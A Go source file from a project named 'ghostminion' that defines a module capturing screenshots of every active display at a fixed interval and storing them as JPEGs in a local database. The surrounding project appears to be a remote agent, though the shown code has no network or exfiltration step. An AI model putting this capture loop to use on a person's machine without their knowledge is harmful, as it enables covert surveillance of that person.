package apps

import (
	"bytes"
	"ghostminion/db"
	"github.com/kbinani/screenshot"
	"image"
	"image/jpeg"
	"sync"
	"time"
)

type ScreenshotApp struct {
	Interval int8 `json:"interval"`
}

var stopScreenshotApp = false

func (c *ScreenshotApp) Start(wg *sync.WaitGroup) {
	defer wg.Done()

	for stopScreenshotApp != true {
		c.runScreenshot()
		time.Sleep(time.Duration(c.Interval) * time.Second)
	}
}

func (c *ScreenshotApp) Stop() {
	stopScreenshotApp = true
}

func (c *ScreenshotApp) Validate() error {
	return nil
}

func (c *ScreenshotApp) runScreenshot() {
	numOfActiveDisplays := screenshot.NumActiveDisplays()
	if numOfActiveDisplays <= 0 {
		lgr.Error("No active displays found")
		return
	}

	all := image.Rect(0, 0, 0, 0)

	for i := 0; i < numOfActiveDisplays; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		all = bounds.Union(all)
		captureTime := time.Now().Unix()
		lgr.Info("Screenshot captured at", captureTime, " for display ", i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			lgr.Error("Error capturing screenshot: ", err)
			continue
		}
		var buf bytes.Buffer
		err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 80})
		if err != nil {
			lgr.Error("Error encoding jpeg image: ", err)
		}
		err = db.WriteDataRow("", db.ScreenshotsDataType, buf.Bytes()) // replace requestId
		if err != nil {
			lgr.Error("Error writing file data: ", err)
		}
	}
}
